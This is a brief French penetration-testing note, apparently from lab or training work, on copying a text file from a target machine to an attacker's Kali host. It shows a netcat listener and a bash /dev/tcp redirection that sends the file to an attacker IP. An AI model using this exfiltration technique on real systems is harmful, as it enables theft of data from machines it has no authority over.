# Export fichier texte de la cible vers Kali :
Sur Kali :
```
nc -lnvp 9999 > fichier.txt
```
Sur la cible :
```
cat fichier.txt > /dev/tcp/192.168.45.176/9999
```
